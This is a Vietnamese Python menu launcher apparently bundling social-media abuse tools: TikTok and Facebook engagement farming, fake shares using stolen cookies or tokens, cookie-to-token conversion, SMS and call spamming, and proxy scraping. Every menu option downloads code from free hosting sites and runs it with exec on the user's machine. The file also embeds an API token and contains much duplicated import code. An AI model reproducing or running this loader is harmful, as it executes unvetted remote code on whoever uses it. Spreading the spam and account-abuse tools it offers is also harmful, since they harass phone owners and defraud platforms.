import hashlib
import random
import string
import time
import urllib.parse
import json
import requests
import sys
from bs4 import BeautifulSoup
import requests
import random
import json
import string
import time
import subprocess
from concurrent.futures import ThreadPoolExecutor
from lequangminh import*
import os
from builtins import all,exec,format,id,print,int,range,set,str,open,quit
exec('')
import os
os.system("cls" if os.name == "nt" else "clear")
try:
	import requests,colorama,prettytable
except:
	os.system('pip install requests')
	os.system('pip install colorama')
	os.system('pip install prettytable')
import threading,requests,ctypes,random,json,time,base64,sys,re
from prettytable import PrettyTable
import random
from time import strftime
from colorama import init,Fore
from urllib.parse import urlparse,unquote,quote
from string import ascii_letters,digits
from bs4 import BeautifulSoup
from datetime import datetime
import re,requests,os,sys
from time import sleep 
from datetime import date
import requests, random
import requests
import base64, json,os
from datetime import date
from datetime import datetime
from time import sleep,strftime
from bs4 import BeautifulSoup
from datetime import datetime
import re,requests,os,sys
from time import sleep 
from datetime import date
import requests, random
import uuid, re
from pystyle import Write,Colors
from bs4 import BeautifulSoup
import socket
from pystyle import *
import os,sys
import requests,json
from time import sleep
from datetime import datetime, timedelta
import base64,requests,os
#bỏ qua chúng chỉ ssl
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
#các hàm
def generate_key(length=20):
    characters = string.digits + string.ascii_lowercase + string.ascii_uppercase
    key = ''.join(random.choice(characters) for _ in range(length))
    return key

def generate_hourly_key():
    current_time = time.strftime('%Y%m%d%H')
    hourly_key = hashlib.md5(current_time.encode()).hexdigest()
    return hourly_key[:20]

key1 = generate_hourly_key()
long_url = "Bug Tool Cái Đầu Bùi Nhà Mày" + key1
def shorten_url(long_url):
    link = ''
    api_url = f"https://dilink.net/QL_api.php?token=6cb4deef9316f81e8d94b8c23bd6aebcb6b33da029500695973b156694ad169c&url={long_url}"
    response = requests.get(api_url).text
    for i in range(432,len(response)):
        if response[i] == '"':
            break
        link = link + response[i]
    return link
link = shorten_url(long_url)
def generate_random_string(length):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))
def so(length):
    return ''.join(random.choice(string.digits) for _ in range(length))
def generate_random(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
def generate_imei():
    return ''.join(random.choice(string.digits) for _ in range(15))
def Random_string(length, minh):
    return ''.join(random.choices(minh, k=length))
def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))
def getimei():
    return Random_string(8)+'-'+Random_string(4)+'-'+Random_string(4)+'-'+Random_string(4)+'-'+Random_string(12)
def get_TOKEN():
    return Random_string(22)+':'+Random_string(9)+'-'+Random_string(20)+'-'+Random_string(12)+'-'+Random_string(7)+'-'+Random_string(7)+'-'+Random_string(53)+'-'+Random_string(9)+'_'+Random_string(11)+'-'+Random_string(4)
def Random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))
def random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))
mail = generate_random(10)+'@gmail.com'
to=generate_random(53)+'-'+generate_random(86)+'-'+generate_random(121)+'_'+generate_random(2)+'-'+generate_random(94)+'-'+generate_random(3)+'_'+generate_random(9)+'-'+generate_random(15)+'_'+generate_random(17)+'-'+generate_random(39)+'_'+generate_random(85)+'_'+generate_random(34),
threading = ThreadPoolExecutor(max_workers=int(10000000))
from colorama import Fore
thatbai=0
day=0
status='ACTIVE'
blue = Col.light_blue
lblue = Colors.StaticMIX((Col.light_green, Col.white, Col.white))
red = Colors.StaticMIX((Col.green, Col.white, Col.white))
def format_print1(text):
    return f"""                       {lblue}{text}{Col.reset}"""

def format_input1(text):
    return f"""                       {lblue}{text}{Col.reset}"""
def format_print(symbol, text):
    return f"""                      {Col.Symbol(symbol, lblue, blue)} {lblue}{text}{Col.reset}"""

def format_input(symbol, text):
    return f"""                      {Col.Symbol(symbol, red, blue)} {red}{text}{Col.reset}"""
banner1='''



'''
ascii = r'''

  '''


from builtins import all,exec,format,id,print,int,range,set,str,open,quit
exec('')
import os
try:
	import requests,colorama,prettytable
except:
	os.system('pip install requests')
	os.system('pip install colorama')
	os.system('pip install prettytable')
import threading,requests,ctypes,random,json,time,base64,sys,re
from prettytable import PrettyTable
import random
from time import strftime
from colorama import init,Fore
from urllib.parse import urlparse,unquote,quote
from string import ascii_letters,digits
from bs4 import BeautifulSoup
from datetime import datetime
import re,requests,os,sys
from time import sleep 
from datetime import date
import requests, random
import requests
import base64, json,os
from datetime import date
from datetime import datetime
from time import sleep,strftime
from bs4 import BeautifulSoup
from datetime import datetime
import re,requests,os,sys
from time import sleep 
from datetime import date
import requests, random
import uuid, re
from pystyle import Write,Colors
from bs4 import BeautifulSoup
import socket
from datetime import datetime
time=datetime.now().strftime("%H:%M:%S")
from pystyle import *
data_machine = []
today = date.today()
now = datetime.now()
thu = now.strftime("%A")
ngay_hom_nay = now.strftime("%d")
thang_nay = now.strftime("%m")
nam_ = now.strftime("%Y")
#IP
def get_ip_from_url(url):
    response = requests.get(url)
    ip_address = socket.gethostbyname(response.text.strip())
    return ip_address
url = "http://kiemtraip.com/raw.php"
ip = get_ip_from_url(url)
import os,sys
import requests,json
from time import sleep
from datetime import datetime, timedelta
import base64,requests,os
#MÀU
xnhac = "\033[1;36m"
do = "\033[1;31m"
luc = "\033[1;32m"
vang = "\033[1;33m"
xduong = "\033[1;34m"
hong = "\033[1;35m"
trang = "\033[1;39m"
whiteb="\033[1;39m"
red="\033[0;31m"
redb="\033[1;31m"
end='\033[0m'
#ĐÁNH DẤU BẢN QUYỀN
dev="\033[1;39m[\033[1;31m×\033[1;39m]\033[1;39m"
def banner():
 banner = f"""
\033[1;32m

┌────────────────────────────────────────────────┐
│                 VLONG ZZ ĐẸP CHAI              │
└────────────────────────────────────────────────┘
                                    

\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = 
"""
 for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush() 
  sleep(0.000001)
 
 
# =======================[RUN]=======================#
while True:
	os.system('clear')
	banner()
	print("\033[1;39m┌───────────────────┐         ")
	print("\033[1;32m║\033[1;39m      TOOL GỘP     \033[1;32m║          ")
	print("\033[1;39m└───────────────────┘          ")
	print("\033[1;31m[\033[1;39m1\033[1;31m] \033[1;32mTOOL TDS TIKTOK ")
	print("\033[1;31m[\033[1;39m2\033[1;31m] \033[1;32mTOOL TDS FB COOKIE ")
	
	
	print("\033[1;31m[\033[1;39m3\033[1;31m] \033[1;32mTOOL NUÔI FACEBOOK ")
	
	print("\033[1;31m[\033[1;39m4\033[1;31m] \033[1;32mBOX ZALO GIAO LƯU  ")
	
	print("\033[1;31m[\033[1;39m5\033[1;31m] \033[1;32mTOOL TTC Pr5")
	
	print("\033[1;31m[\033[1;39m6\033[1;31m] \033[1;32mTOOL REG PAGE PROFILE ")
	print("\033[1;31m[\033[1;39m7\033[1;31m] \033[1;32mTOOL KẾT BẠN FACEBOOK ")

	print("\033[1;39m┌───────────────────┐         ")
	print("\033[1;32m║\033[1;39m TOOL Spam + Buff  \033[1;32m║          ")
	print("\033[1;39m└───────────────────┘          ")
	print("\033[1;31m[\033[1;39m01\033[1;31m] \033[1;32mBUFF CMT MAX SPEED VIP \033[1;31m[\033[1;39mMAX SPEED\033[1;31m] ")
	print("\033[1;31m[\033[1;39m02\033[1;31m] \033[1;32mTOOL SPAM CALL SMS V1 \033[1;31m[\033[1;39mVIP\033[1;31m] ")
	print("\033[1;31m[\033[1;39m03\033[1;31m] \033[1;32mTOOL SPAM CALL SMS V2 \033[1;31m[\033[1;39mVIP\033[1;31m] ")
	
	print("\033[1;31m[\033[1;39m04\033[1;31m] \033[1;32mTOOL SHARE ẢO PRO5 BẰNG COOKIE\033[1;31m[\033[1;39mMAX SPEED\033[1;31m] ")
	print("\033[1;39m┌───────────────────┐         ")
	print("\033[1;32m║\033[1;39m   TOOL GỘP KHÁC   \033[1;32m║          ")
	print("\033[1;39m└───────────────────┘          ")
	print("\033[1;31m[\033[1;39m001\033[1;31m] \033[1;32mTOOL GỘP CỦA HDT-TOOL")
	print("\033[1;31m[\033[1;39m002\033[1;31m] \033[1;32mTOOL GỘP CỦA T-ĐỨC")
	print("\033[1;31m[\033[1;39m003\033[1;31m] \033[1;32mTOOL GỘP CỦA HUY HOÀNG")
	print("\033[1;31m[\033[1;39m004\033[1;31m] \033[1;32mTOOL GỘP CỦA LTH-ĐĂNG")
	print("\033[1;31m[\033[1;39m005\033[1;31m] \033[1;32mTOOL GỘP CỦA NAM-TOOL")
	print("\033[1;31m[\033[1;39m006\033[1;31m] \033[1;32mTOOL GỘP CỦA Ka-Tool")
	print("\033[1;31m[\033[1;39m007\033[1;31m] \033[1;32mTOOL GỘP BẢN NÂNG CẤP CỦA TMQ")
	print("\033[1;39m┌────────────────────────────────┐         ")
	print("\033[1;32m║\033[1;39m  TOOL SHARE ẢO TOKEN CÓ DELAY  \033[1;32m║          ")
	print("\033[1;39m└────────────────────────────────┘          ")
	print("\033[1;31m[\033[1;39m1.1\033[1;31m] \033[1;32mĐỔI COOKIE FB SANG TOKEN FB ")
	print("\033[1;31m[\033[1;39m1.2\033[1;31m] \033[1;32mGET TOKEN PRO5 ")
	print("\033[1;31m[\033[1;39m1.3\033[1;31m] \033[1;32mSHARE ẢO TOKEN CÓ DELAY VIP  ")
	print("\033[1;39m┌────────────────────────────────┐         ")
	print("\033[1;32m║\033[1;39m        TOOL ĐÀO PROXY          \033[1;32m║          ")
	print("\033[1;39m└────────────────────────────────┘          ")
	print("\033[1;31m[\033[1;39m1.11\033[1;31m] \033[1;32mĐÀO PROXY ")
	print("\033[1;31m[\033[1;39m1.12\033[1;31m] \033[1;32mLỌC PROXY ")

	
	chon = input('\033[1;39m[\033[1;31m×\033[1;39m] \033[1;39m>> \033[1;39m[\033[1;32mNhập Số\033[1;39m]\033[1;39m: \033[1;32m')
	if chon == '1' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/tktok.php').text)
	if chon == '2' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/fb.php').text)
	if chon == '3' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/nuoifb.php').text)
	if chon == '4':
		os.system('xdg-open https://zalo.me/g/hnukjv833'); 
	if chon == '5' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/ttcpro5.php').text)
	if chon == '6' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/regpage.php').text)
	if chon == '7' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/addbanbe.php').text)
	if chon == '01' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/up.php').text)
	if chon == '02':
		exec(requests.get('https://run.mocky.io/v3/669c9bd4-8075-497c-bd00-8fd1c795d691').text)
	if chon == '03':
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/call02.php').text)
	if chon == '04' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/shareaovlong.php').text)
	if chon == '001' :
		exec(requests.get('https://run.mocky.io/v3/347e758c-9840-4e86-8508-b7bb9917cbee').text)
	if chon == '002' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/tgduc.py').text)
	if chon == '003' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/huyhoang.pyq').text)
	if chon == '004' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/lthdang.py').text)
	if chon == '005' :
		exec(requests.get('https://run.mocky.io/v3/68259a02-6b2e-4291-99a5-a602497c9591').text)
	if chon == '006' :
		exec(requests.get('https://run.mocky.io/v3/23f7d4b7-f8ef-491e-bdcd-90bc254a79c4').text)
	if chon == '007' :
		exec(requests.get('https://run.mocky.io/v3/537e2e7d-98ba-4df5-8e98-8aa77971fb35').text)
	if chon == '1.1' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/so1.1.php').text)
	if chon == '1.2' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/so1.2.php').text)
	if chon == '1.3' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/so1.3.php').text)
	if chon == '1.11' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/prx.php').text)
	if chon == '1.12' :
		exec(requests.get('http://keyduyanhfree24.x10.mx/Tool/checklivee.php').text)
	else :
		continue